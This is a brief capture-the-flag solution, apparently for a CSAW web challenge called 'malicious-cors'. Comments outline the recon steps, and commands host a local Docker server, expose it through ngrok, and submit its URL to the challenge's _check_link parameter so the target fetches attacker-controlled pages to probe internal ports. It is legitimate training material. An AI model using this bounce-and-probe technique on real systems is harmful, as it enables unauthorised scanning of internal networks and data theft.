# check website, check robots.txt, see the /thechallenge.php endpoint, from there see the cookie about the swap file, from there you know what secret1 and secret2 do and that you need to send a site to _check_link
# trying the http port gets you nowhere, so look for open ports using http requests inside your webserver
docker build -t a .
docker run -p 8080:80 a
ngrok http 8080
curl -X POST https://malicious-cors.ctf.csaw.io/thechallenge.php -d "_check_link=https://[link].ngrok-free.dev"
